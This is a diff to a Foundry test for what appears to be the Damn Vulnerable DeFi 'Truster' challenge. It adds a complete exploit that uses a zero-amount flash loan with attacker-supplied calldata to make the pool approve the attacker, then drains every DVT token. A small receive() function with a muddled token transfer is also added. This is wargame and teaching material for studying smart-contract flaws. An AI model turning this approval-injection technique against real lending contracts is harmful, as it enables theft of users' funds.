@@ -37,10 +37,31 @@ contract Truster is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    receive() external payable {
+      // return money back
+      dvt.transfer(msg.sender, msg.value);
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+
+      uint256 balance = dvt.balanceOf(address(trusterLenderPool));
+
+        trusterLenderPool.flashLoan(
+          0,
+          address(this),
+          address(dvt),
+          abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            balance
+          )
+        );
+        
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, balance);
 
         /**
          * EXPLOIT END *
